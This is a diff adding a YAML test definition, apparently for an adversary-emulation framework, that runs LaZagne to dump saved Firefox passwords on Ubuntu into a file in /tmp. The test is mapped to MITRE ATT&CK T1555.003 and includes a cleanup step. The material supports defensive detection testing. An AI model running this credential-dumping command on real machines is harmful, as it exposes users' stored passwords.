@@ -1,0 +1,31 @@
+api_version: "2.0"
+name: LaZagne.py - Dump Credentials from Firefox Browser
+description: Credential Dump Ubuntu 20.04.4 LTS Focal Fossa Firefox Browser, Reference https://github.com/AlessandroZ/LaZagne
+args:
+    - name: lazagne_path
+      type: string
+      default: /tmp/LaZagne/Linux
+    - name: specific_module
+      type: string
+      default: browsers -firefox
+    - name: output_file
+      type: string
+      default: /tmp/firefox_password.txt
+uuid: 87e88698-621b-4c45-8a89-4eaebdeaabb1
+mitre:
+    tactics:
+        - 'TA0006: Credential Access'
+    techniques:
+        - 'T1555: Credentials from Password Stores'
+    subtechniques:
+        - 'T1555.003: Credentials from Web Browsers'
+requirements:
+    platforms:
+        - os: linux
+steps:
+    - name: lazagne.py---dump-credentials-from-firefox-browser
+      inline: python3 {{.Args.lazagne_path}}/laZagne.py {{.Args.specific_module}} >> {{.Args.output_file}}
+      executor: sh
+      cleanup:
+        inline: rm -R /tmp/LaZagne; rm -f {{.Args.output_file}}
+        executor: sh
